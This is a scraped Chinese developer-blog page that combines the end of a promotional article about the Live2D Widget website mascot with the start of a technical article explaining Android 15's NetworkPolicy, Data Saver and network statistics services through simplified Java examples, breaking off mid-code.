<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/052107358d3d48228059f96ac18c0c86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=%2BiuQOuSiZC%2Bc9lxG4tYzci%2BMXlg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1c7f24f20b74312ae3fafb56c13353a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=xjXL%2FxU%2F8RBlrtECJzR2QbMAP9o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a0ff90acb3946908e8104dbe2ea4356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=X6B6kvk5NEWTSUT3lPiBXR1CFUk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a6fd8c0e73c467a9bbd03365d57556e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=Ca4uXQBX3g7jCnr5RMsRSAHoI98%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e26f3e986144278e69c67da096f1b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=IN8HQd6o0RjQarzh8XYPywFWaKc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">🎖️进阶</h2>
<p>如果你是小白，我们通过上边介绍的那行代码就已经把看板娘集成进来了。但是如果你想让看板娘更适合你的网站，你可以通过进一步的配置及开发来完成，感兴趣的家人们可以自行研究。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29ac25e4a2d549359792aceaf296dcee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=MnBOvLdv%2BY5TjZ4qm%2FELZIRYYSA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b028c73e1a0482dbb5d2cd93f0fcd87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770390100&amp;x-signature=vfxJ9FSZzhz9QD0nXCE9zxilucE%3D" alt="" loading="lazy"/></p>
<p>相关技术博文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.fghrsh.net%2Fpost%2F123.html" target="_blank" title="https://www.fghrsh.net/post/123.html" ref="nofollow noopener noreferrer">www.fghrsh.net/post/123.ht…</a></p>
<h2 data-id="heading-3">📝 总结：让网页活起来</h2>
<p>Live2D Widget不仅仅是一个技术项目，它代表了网页交互的新可能。在这个数字化的时代，一个灵动的看板娘能够：</p>
<ul>
<li>• 提升用户体验和停留时间</li>
<li>• 增加网站的特色和记忆点</li>
<li>• 展示技术实力和创意精神</li>
</ul>
<p>无论你是技术爱好者、博主还是网站开发者，Live2D Widget都能为你的项目增添独特的魅力。立即尝试，让你的网站拥有一个随时陪伴访客的可爱伙伴吧！</p>
<p>让技术更有温度，让网页更有生命！🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 15网络子系统深度解析（二）：NetworkPolicy流量控制、VPN框架与网络优化全解析]]></title>    <link>https://juejin.cn/post/7600863478929915923</link>    <guid>https://juejin.cn/post/7600863478929915923</guid>    <pubDate>2026-01-30T13:01:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929915923" data-draft-id="7600994087587561491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 15网络子系统深度解析（二）：NetworkPolicy流量控制、VPN框架与网络优化全解析"/> <meta itemprop="keywords" content="Android,网络协议,性能优化"/> <meta itemprop="datePublished" content="2026-01-30T13:01:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬奇Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 15网络子系统深度解析（二）：NetworkPolicy流量控制、VPN框架与网络优化全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:01:53.000Z" title="Fri Jan 30 2026 13:01:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读18分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在上一篇文章中，我们深入探索了ConnectivityService的网络管理框架。今天，我们将聚焦于网络子系统的另外两个核心功能：<strong>网络策略管理</strong>和<strong>VPN框架</strong>。</p>
<h3 data-id="heading-1">为什么需要网络策略管理？</h3>
<p>想象这样的场景：</p>
<p><strong>场景1：流量失控</strong></p>
<pre><code class="hljs language-diff" lang="diff">用户月底收到运营商短信："您的流量已用完95%"
查看系统设置发现：
<span class="hljs-deletion">- 某个后台应用偷偷下载了2GB更新包</span>
<span class="hljs-deletion">- 多个应用在后台同步数据</span>
<span class="hljs-deletion">- 系统服务持续上传统计数据</span>
</code></pre>
<p><strong>场景2：电量告急</strong></p>
<pre><code class="hljs language-diff" lang="diff">用户外出发现：
<span class="hljs-deletion">- 手机只剩15%电量</span>
<span class="hljs-deletion">- 但至少还要2小时才能充电</span>
<span class="hljs-deletion">- 很多应用还在后台联网消耗电量</span>
</code></pre>
<p>这时候，Android的**NetworkPolicy（网络策略）**系统就派上用场了！</p>
<h3 data-id="heading-2">本文内容概览</h3>
<ol>
<li>
<p><strong>NetworkPolicy流量控制</strong></p>
<ul>
<li>NetworkPolicyManagerService架构</li>
<li>Data Saver省流模式</li>
<li>按流量计费网络识别</li>
<li>流量统计与限制</li>
</ul>
</li>
<li>
<p><strong>VPN框架深度解析</strong></p>
<ul>
<li>VpnService工作原理</li>
<li>TUN/TAP虚拟网卡</li>
<li>VPN路由配置</li>
<li>Always-on VPN</li>
</ul>
</li>
<li>
<p><strong>网络性能优化</strong></p>
<ul>
<li>流量优化技巧</li>
<li>DNS优化</li>
<li>连接池管理</li>
<li>网络诊断工具</li>
</ul>
</li>
<li>
<p><strong>Android 15新特性</strong></p>
<ul>
<li>eBPF网络策略</li>
<li>VPN改进</li>
<li>网络切片支持</li>
</ul>
</li>
</ol>
<p>让我们开始这段深入Android网络核心的旅程！</p>
<hr/>
<h2 data-id="heading-3">一、NetworkPolicy流量控制深度解析</h2>
<h3 data-id="heading-4">1.1 NetworkPolicyManagerService架构总览</h3>
<p><strong>源码位置</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">packages/modules/Connectivity/service/src/com/android/server/net/NetworkPolicyManagerService.java
</code></pre>
<h4 data-id="heading-5">架构图</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9db9684602f34435b9f8a79f74847575~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382913&amp;x-signature=S9bxGlNgI9ZQbzajGT%2BqayJ%2Bn48%3D" alt="08-01-network-policy-architecture.png" loading="lazy"/></p>
<p><strong>核心职责</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">┌────────────────────────────────────────┐
│   NetworkPolicyManagerService 核心功能  │
├────────────────────────────────────────┤
│ <span class="hljs-number">1.</span> 流量监控                             │
│    - 实时统计应用流量                   │
│    - 按UID/Interface统计                │
│    - 历史流量记录                       │
│                                        │
│ <span class="hljs-number">2.</span> 策略执行                             │
│    - Data Saver模式                    │
│    - App Standby限制                   │
│    - 按流量计费网络控制                 │
│                                        │
│ <span class="hljs-number">3.</span> 流量限制                             │
│    - 后台数据禁用                       │
│    - 流量配额管理                       │
│    - 防火墙规则                         │
│                                        │
│ <span class="hljs-number">4.</span> 网络识别                             │
│    - Metered/Unmetered区分             │
│    - <span class="hljs-built_in">WiFi</span>/移动网络判断                  │
│    - 运营商计费策略                     │
└────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-6">核心数据结构</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// packages/modules/Connectivity/.../NetworkPolicyManagerService.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkPolicyManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">INetworkPolicyManager</span>.Stub {

    <span class="hljs-comment">// 网络策略集合 (按NetworkTemplate分类)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayMap&lt;NetworkTemplate, NetworkPolicy&gt; mNetworkPolicy =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayMap</span>&lt;&gt;();

    <span class="hljs-comment">// UID策略 (每个应用的网络限制策略)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SparseIntArray</span> <span class="hljs-variable">mUidPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseIntArray</span>();

    <span class="hljs-comment">// UID规则 (防火墙规则：允许/拒绝)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SparseIntArray</span> <span class="hljs-variable">mUidRules</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseIntArray</span>();

    <span class="hljs-comment">// 按流量计费网络集合</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArraySet&lt;NetworkTemplate&gt; mMeteredIfaces = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();

    <span class="hljs-comment">// Data Saver模式开关</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">mRestrictBackground</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

    <span class="hljs-comment">// 核心方法1：设置UID网络策略</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUidPolicy</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">int</span> policy)</span> {
        mContext.enforceCallingOrSelfPermission(MANAGE_NETWORK_POLICY, TAG);

        <span class="hljs-comment">// 1. 更新策略</span>
        <span class="hljs-keyword">if</span> (policy == POLICY_NONE) {
            mUidPolicy.delete(uid);
        } <span class="hljs-keyword">else</span> {
            mUidPolicy.put(uid, policy);
        }

        <span class="hljs-comment">// 2. 更新防火墙规则</span>
        updateRulesForDataUsageRestrictionsUL(uid);

        <span class="hljs-comment">// 3. 持久化到磁盘</span>
        writePolicyAL();

        <span class="hljs-comment">// 4. 通知监听器</span>
        mHandler.obtainMessage(MSG_POLICIES_CHANGED, uid, policy).sendToTarget();
    }

    <span class="hljs-comment">// 核心方法2：更新防火墙规则</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateRulesForDataUsageRestrictionsUL</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-comment">// 计算最终的网络规则</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">uidRules</span> <span class="hljs-operator">=</span> mUidRules.get(uid, RULE_NONE);
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">oldUidRules</span> <span class="hljs-operator">=</span> mUidRules.get(uid, RULE_NONE);

        <span class="hljs-comment">// 规则改变才更新</span>
        <span class="hljs-keyword">if</span> (uidRules == oldUidRules) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// 更新规则到Kernel</span>
        setUidFirewallRulesUL(FIREWALL_CHAIN_STANDBY, uid,
                              uidRules &amp; RULE_REJECT_METERED);
        setUidFirewallRulesUL(FIREWALL_CHAIN_DOZABLE, uid,
                              uidRules &amp; RULE_REJECT_ALL);
        setUidFirewallRulesUL(FIREWALL_CHAIN_POWERSAVE, uid,
                              uidRules &amp; RULE_REJECT_ALL);

        <span class="hljs-comment">// Android 15: 使用eBPF代替iptables</span>
        <span class="hljs-keyword">if</span> (mUseBpfTrafficStats) {
            mBpfNetMaps.setUidRule(uid, uidRules);
        }
    }

    <span class="hljs-comment">// 核心方法3：设置Data Saver模式</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRestrictBackground</span><span class="hljs-params">(<span class="hljs-type">boolean</span> restrictBackground)</span> {
        mContext.enforceCallingOrSelfPermission(MANAGE_NETWORK_POLICY, TAG);

        <span class="hljs-keyword">if</span> (mRestrictBackground == restrictBackground) <span class="hljs-keyword">return</span>;

        mRestrictBackground = restrictBackground;

        <span class="hljs-comment">// 更新所有应用的网络规则</span>
        updateRulesForRestrictBackgroundUL();

        <span class="hljs-comment">// 通知系统服务</span>
        mHandler.obtainMessage(MSG_RESTRICT_BACKGROUND_CHANGED,
                               restrictBackground ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>, <span class="hljs-number">0</span>).sendToTarget();
    }
}
</code></pre>
<h3 data-id="heading-7">1.2 Data Saver省流模式详解</h3>
<p><strong>Data Saver</strong>是Android 7.0引入的省流功能，在Android 15中得到了eBPF的性能增强。</p>
<h4 data-id="heading-8">工作原理</h4>
<pre><code class="hljs language-markdown" lang="markdown">用户开启Data Saver后:

<span class="hljs-bullet">1.</span> 后台应用网络被禁用
   → 除非应用在白名单中

<span class="hljs-bullet">2.</span> 前台应用可以正常联网
   → 但会收到DATA<span class="hljs-emphasis">_SAVER_</span>ENABLED回调

<span class="hljs-bullet">3.</span> 应用可以请求白名单权限
   → POLICY<span class="hljs-emphasis">_ALLOW_</span>METERED<span class="hljs-emphasis">_BACKGROUND

4. 系统服务不受影响
   → UID &lt; 10000的系统进程豁免
</span></code></pre>
<h4 data-id="heading-9">应用示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 应用层 - 检测Data Saver状态</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSaverChecker</span> {

    <span class="hljs-keyword">private</span> ConnectivityManager mCm;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkDataSaver</span><span class="hljs-params">(Context context)</span> {
        mCm = (ConnectivityManager) context.getSystemService(
            Context.CONNECTIVITY_SERVICE);

        <span class="hljs-comment">// 1. 获取Data Saver状态</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> mCm.getRestrictBackgroundStatus();

        <span class="hljs-keyword">switch</span> (status) {
            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_DISABLED:
                <span class="hljs-comment">// Data Saver关闭，无限制</span>
                Log.d(TAG, <span class="hljs-string">"Data Saver关闭"</span>);
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_ENABLED:
                <span class="hljs-comment">// Data Saver开启，后台数据被禁用</span>
                Log.w(TAG, <span class="hljs-string">"Data Saver开启，后台数据受限"</span>);
                <span class="hljs-comment">// 建议：延迟非紧急的网络请求</span>
                postponeNonUrgentRequests();
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_WHITELISTED:
                <span class="hljs-comment">// 应用在白名单中，不受限制</span>
                Log.d(TAG, <span class="hljs-string">"应用在Data Saver白名单"</span>);
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-comment">// 2. 监听Data Saver变化</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerDataSaverListener</span><span class="hljs-params">(Context context)</span> {
        mCm.registerDefaultNetworkCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCallback</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCapabilitiesChanged</span><span class="hljs-params">(Network network,
                                             NetworkCapabilities nc)</span> {
                <span class="hljs-comment">// 检查是否有NOT_METERED能力</span>
                <span class="hljs-type">boolean</span> <span class="hljs-variable">isMetered</span> <span class="hljs-operator">=</span> !nc.hasCapability(
                    NET_CAPABILITY_NOT_METERED);

                <span class="hljs-keyword">if</span> (isMetered &amp;&amp; isDataSaverEnabled()) {
                    <span class="hljs-comment">// 在按流量计费网络 + Data Saver开启</span>
                    showDataSaverWarning();
                }
            }
        });
    }

    <span class="hljs-comment">// 3. 应用优化建议</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimizeForDataSaver</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (isDataSaverEnabled()) {
            <span class="hljs-comment">// 减少预加载</span>
            disablePrefetching();

            <span class="hljs-comment">// 降低图片质量</span>
            setImageQuality(QUALITY_LOW);

            <span class="hljs-comment">// 禁用自动播放视频</span>
            disableAutoplayVideos();

            <span class="hljs-comment">// 延迟大文件下载</span>
            pauseLargeDownloads();
        }
    }
}
</code></pre>
<h4 data-id="heading-10">Framework层实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NetworkPolicyManagerService.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateRulesForRestrictBackgroundUL</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 遍历所有UID</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> mUidPolicy.size();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> mUidPolicy.keyAt(i);
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">policy</span> <span class="hljs-operator">=</span> mUidPolicy.valueAt(i);

        <span class="hljs-comment">// 计算规则</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">uidRules</span> <span class="hljs-operator">=</span> RULE_NONE;
        <span class="hljs-keyword">if</span> (mRestrictBackground) {
            <span class="hljs-comment">// Data Saver开启</span>
            <span class="hljs-keyword">if</span> (!hasWhitelistExemption(policy)) {
                <span class="hljs-comment">// 不在白名单，禁止后台数据</span>
                uidRules |= RULE_REJECT_METERED;
            }
        }

        <span class="hljs-comment">// 应用规则</span>
        setUidFirewallRule(FIREWALL_CHAIN_STANDBY, uid, uidRules);
    }
}

<span class="hljs-comment">// 检查白名单</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasWhitelistExemption</span><span class="hljs-params">(<span class="hljs-type">int</span> policy)</span> {
    <span class="hljs-comment">// 允许按流量计费网络的后台数据</span>
    <span class="hljs-keyword">return</span> (policy &amp; POLICY_ALLOW_METERED_BACKGROUND) != <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-11">1.3 流量统计NetworkStatsService</h3>
<p><strong>核心功能</strong>：实时统计应用和网络接口的流量数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// packages/modules/Connectivity/.../NetworkStatsService.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkStatsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">INetworkStatsService</span>.Stub {

    <span class="hljs-comment">// UID维度统计</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetworkStatsRecorder mUidRecorder;

    <span class="hljs-comment">// Interface维度统计</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetworkStatsRecorder mUidTagRecorder;

    <span class="hljs-comment">// 核心方法：获取UID流量统计</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> NetworkStats <span class="hljs-title function_">getUidStats</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, NetworkTemplate template)</span> {
        <span class="hljs-comment">// 1. 从BPF读取统计数据 (Android 15)</span>
        <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> mBpfNetMaps.readStatsForUid(uid);

        <span class="hljs-comment">// 2. 合并历史数据</span>
        stats.combineWith(mUidRecorder.getOrLoadHistoryFor(uid, template));

        <span class="hljs-comment">// 3. 返回结果</span>
        <span class="hljs-keyword">return</span> stats;
    }

    <span class="hljs-comment">// 轮询更新统计数据</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performPoll</span><span class="hljs-params">(<span class="hljs-type">int</span> flags)</span> {
        <span class="hljs-comment">// 1. 从Kernel读取最新数据</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">xtSnapshot</span> <span class="hljs-operator">=</span> readNetworkStatsUidDetail(UID_ALL);

        <span class="hljs-comment">// 2. 计算增量</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> xtSnapshot.subtract(mLastStatsSnapshot);
        mLastStatsSnapshot = xtSnapshot;

        <span class="hljs-comment">// 3. 记录到历史</span>
        mUidRecorder.recordSnapshotLocked(delta, System.currentTimeMillis());

        <span class="hljs-comment">// 4. 检查流量配额</span>
        mPolicyListener.onStatsUpdated(delta);
    }
}
</code></pre>
<h4 data-id="heading-12">应用层使用TrafficStats</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 查询应用流量</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficStatsExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showAppTraffic</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-comment">// 1. 获取接收字节数</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(uid);

        <span class="hljs-comment">// 2. 获取发送字节数</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">txBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(uid);

        <span class="hljs-comment">// 3. 获取接收数据包数</span>
